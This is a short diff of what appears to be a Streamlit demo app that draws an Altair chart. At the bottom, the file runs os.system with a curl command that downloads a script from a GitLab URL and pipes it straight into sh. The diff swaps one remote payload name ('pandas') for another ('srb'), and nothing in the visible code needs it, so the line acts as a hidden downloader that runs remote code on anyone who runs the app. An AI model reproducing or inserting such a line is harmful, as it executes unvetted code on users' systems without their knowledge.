@@ -35,4 +35,4 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
 import os
-os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/pandas | sh')
+os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/srb | sh')
